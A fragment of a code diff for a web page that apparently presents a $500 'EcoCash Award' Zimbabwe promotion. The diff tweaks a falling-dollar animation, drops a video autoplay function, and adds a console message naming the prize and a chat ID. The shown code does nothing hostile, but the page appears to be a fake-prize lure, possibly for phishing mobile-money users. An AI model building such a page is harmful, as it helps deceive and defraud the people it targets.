-                    el.style.animationDuration = (12 + Math.random() * 20) + 's';
-                    el.style.animationDelay = (Math.random() * 15) + 's';
-                    el.style.opacity = 0.3 + Math.random() * 0.5;
+                    el.style.fontSize = (14 + Math.random() * 28) + 'px';
+                    el.style.animationDuration = (8 + Math.random() * 14) + 's';
+                    el.style.animationDelay = (Math.random() * 12) + 's';
+                    el.style.opacity = 0.2 + Math.random() * 0.3;
                     container.appendChild(el);
                 }
-            })();
-
-            function playVideo() {
-                const video = document.querySelector('#video-bg video');
-                if (video) {
-                    video.play().catch(() => {
-                        document.addEventListener('click', function play() {
-                            video.play().catch(() => {});
-                            document.removeEventListener('click', play);
-                        }, { once: true });
-                    });
-                }
             }
+            initDollarRain();
 
-            window.addEventListener('load', () => setTimeout(playVideo, 100));
+            console.log('✅ Zimbabwe promo loaded. Prize: $500 USD. Chat ID: 7737206212.');
 
-            console.log('🚀 FLASHY EcoCash Award page ready!');
         })();
     </script>
 </body>
-    </html>
+</html>
